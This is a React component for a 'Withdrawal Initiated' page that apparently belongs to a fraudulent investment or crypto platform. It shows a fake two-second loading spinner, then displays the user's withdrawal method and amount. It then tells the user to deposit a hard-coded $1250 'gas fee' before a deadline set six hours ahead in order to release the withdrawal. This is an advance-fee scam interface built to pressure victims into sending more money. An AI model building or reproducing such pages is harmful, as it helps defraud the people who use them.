import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const location = useLocation();
  const state = location.state || {};
  const method = state.method || "Not specified";
  const amount = state.amount || 0;
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  const deadline = new Date(Date.now() + 6 * 60 * 60 * 1000).toLocaleString();

  if (loading) {
    // Full page loader
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="w-16 h-16 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="max-w-3xl w-full bg-white shadow-lg rounded-lg p-10">
        <h1 className="text-4xl font-bold text-center text-indigo-700 mb-8">
          Withdrawal Initiated
        </h1>

        <div className="space-y-6 text-lg text-gray-800">
          <p>
            <strong>Method:</strong> {method}
          </p>
          <p>
            <strong>Amount:</strong> ${amount}
          </p>
          <p className="text-red-600 font-semibold text-center">
            Instruction: Please deposit <strong>$1250</strong> as a gas fee into
            your account before <strong>{deadline}</strong> to complete the
            withdrawal.
          </p>
        </div>
      </div>
    </div>
  );
}
